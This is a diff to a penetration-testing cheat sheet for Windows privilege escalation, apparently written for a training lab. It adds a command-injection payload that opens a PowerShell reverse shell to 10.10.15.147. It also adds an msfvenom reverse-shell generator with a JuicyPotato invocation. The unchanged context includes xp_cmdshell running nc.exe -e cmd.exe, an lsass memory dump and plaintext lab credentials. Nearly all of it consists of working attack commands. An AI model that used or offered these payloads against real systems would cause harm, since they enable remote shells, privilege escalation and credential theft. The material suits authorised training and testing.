@@ -25,12 +25,18 @@ $ sudo responder -wrf -v -I tun0
 $ schtasks /query /fo LIST /v
 $ Get-ScheduledTask | select TaskName,State
 $ Set-ExecutionPolicy bypass -Scope process
+$ Get-ChildItem -Path C:\Users\ -Recurse -File | Select-String -Pattern 'ldapadmin'
+$ dir C:\ /s /b | findstr /i "confidential.txt"
 
 * Log Reader
 $ net localgroup "Event Log Readers"
 $ wevtutil qe Security /rd:true /f:text | Select-String "/user"
 $ wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
 $ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+
+* If you get ping command on webshell
+$ 127.0.0.1 && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.147',8899);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+Try:
 
 * You have to got these!
 What is the active directory domain name?
@@ -94,6 +100,9 @@ $ mssqlclient.py sqluser@ipadd -windows-auth
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
 SQL> xp_cmdshell dir\JuicyPotato.exe -l 523375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe iptarget 8443 -e cmd.exe" -t *
+try:
++ msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.147 lport=8008 > this.bat
+$ ./JuicyPotato.exe -t * -p this.bat -l 8008 -clisd "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
 
 * SeDebugPrivilege
 $ procdump.exe -accepteula -ma lsass.exe lsass.dmp
